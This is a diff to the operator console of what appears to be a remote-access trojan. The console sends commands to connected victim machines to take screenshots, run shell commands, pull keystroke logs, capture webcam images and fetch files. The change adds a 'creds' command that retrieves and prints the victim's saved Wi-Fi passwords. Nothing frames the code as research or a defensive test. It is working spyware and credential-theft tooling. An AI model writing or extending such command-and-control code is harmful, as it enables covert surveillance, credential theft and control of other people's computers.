@@ -10,7 +10,7 @@ def list_connected_clients(connected_clients):
 
 def client_menu(client_socket, client_address):
     while True:
-        subcommand = input(f"Enter a command for {client_address[0]} ('screenshot', 'cmd', 'logs', 'webcam', 'file [file_path]', 'back'): ")
+        subcommand = input(f"Enter a command for {client_address[0]} ('screenshot', 'cmd', 'logs', 'webcam', 'file [file_path]', 'creds', 'back'): ")
 
         if subcommand == "screenshot":
             client_socket.sendall(b"screenshot")
@@ -26,6 +26,12 @@ def client_menu(client_socket, client_address):
         elif subcommand == "webcam":
             client_socket.sendall(b"webcam")
             receive_webcam_picture.receive_webcam_picture(client_socket, client_address)
+
+        elif subcommand == "creds":
+            client_socket.sendall(b"creds")
+            password_data = client_socket.recv(4096).decode('utf-8')
+            print("Wi-Fi Passwords:")
+            print(password_data)
 
         elif subcommand.startswith("file"):
             try:
@@ -75,7 +81,7 @@ def handle_client(client_socket, client_address, connected_clients):
 
             else:
                 print("Invalid command.")
-
+    
     except Exception as e:
         print(f"Error occurred - {e}")
 
